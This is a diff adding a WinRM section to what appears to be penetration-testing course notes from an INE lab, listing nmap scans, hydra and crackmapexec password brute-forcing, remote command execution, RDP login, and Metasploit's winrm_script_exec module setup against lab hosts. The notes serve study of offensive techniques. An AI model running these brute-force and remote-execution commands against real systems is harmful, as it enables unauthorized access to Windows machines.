@@ -110,3 +110,23 @@ In order to utilize PsExec to gain access to a Windows target, we will need to i
 - `exploit` --> Detected RDP on 10.2.28.32:3333
 - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333` Running the Hydra tool to find a valid username and password from the provided list.
 - `xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333` We have discovered four valid users and passwords. Access the remote server using xfreerdp tool.
+
+### Exploiting WinRM
+
+Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S). Microsoft implemented WinRM in to Windows in order to make life easier for system administrators. WinRM is typically used in the following ways: Remotely access and interact with Windows hosts on a local network. Remotely access and execute commands on Windows systems. Manage and configure Windows systems remotely. WinRM typically uses TCP port 5985 and 5986 (HTTPS).
+
+### Practical Exploiting WinRM
+
+- `nmap -sV demo.ine.local` The Default Ports that are configured for this scan is only the most common 1000.
+- `nmap -sV -p 5985 demo.ine.local`
+- `crackmapexec` Launches Crackmapexec
+- `crackmapexec winrm 10.2.16.39 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt)` Perform bruteforceattack only on the administrator account.
+- `crackmapexec winrm 10.2.16.39 -u administrator -p tinkerbell -x "whoami"` Use Crackmapexec to execute arbitrary commands and execute whoami on the windows server.
+- `crackmapexec winrm 10.2.16.39 -u administrator -p tinkerbell -x "systeminfo"`  Use Crackmapexec to execute arbitrary commands and execute systeminfo on the windows server.
+- `service postgresql start && msfconsole`
+- `use exploit/windows/winrm/winrm_script_exec`
+- `setg RHOSTS 10.2.16.39`
+- `set USERNAME administrator`
+- `set PASSWORD tinkerbell`
+- `set FORCE_VBS true` Force the module to use the VBS CmdStager
+- `getuid` puts the UID of the process out
